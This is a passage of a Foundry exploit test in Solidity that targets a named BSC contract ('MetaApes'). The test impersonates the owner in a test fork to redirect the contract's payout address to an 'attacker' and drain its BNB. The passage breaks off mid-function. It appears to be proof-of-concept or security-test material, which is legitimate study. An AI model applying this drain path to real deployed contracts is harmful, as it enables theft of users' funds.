}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET address
        vm.label(TARGET, "MetaApes Contract");

        // Get the current owner of the contract
        address owner = MetaApesBSC(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Label attacker for clarity
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);

        // Get contract owner
        address contractOwner = MetaApesBSC(TARGET).getOwner();
        console.log("Contract owner:", contractOwner);

        // Check current tfU address
        address currentTfU = MetaApesBSC(TARGET).tfU();
        console.log("Current tfU address:", currentTfU);

        // Check contract BNB balance before
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract BNB balance before:", contractBalanceBefore);

        // If contract has no BNB, we need to send some first
        if (contractBalanceBefore == 0) {
            // Send some BNB to contract to drain
            deal(TARGET, 10 ether);
            contractBalanceBefore = TARGET.balance;
            console.log("Sent 10 ETH to contract, new balance:", contractBalanceBefore);
        }

        // Strategy 1: If tfU is already the owner, and we can impersonate owner,
        // then draining will send BNB to owner address
        // But we need BNB to go to attacker (address(this))
        // So we need to change tfU to attacker address first

        // Impersonate owner to change tfU to attacker
        vm.startPrank(contractOwner);

        // Get current addresses to preserve them when changing tfU
        address currentMkwA = MetaApesBSC(TARGET).mkwA();
        address currentKrhF = MetaApesBSC(TARGET).krhF();
        address currentMdhS = MetaApesBSC(TARGET).mdhS();
        address currentWthT = MetaApesBSC(TARGET).wthT();
        address currentExtR = MetaApesBSC(TARGET).extR();
        address currentBbaK = MetaApesBSC(TARGET).bbaK();

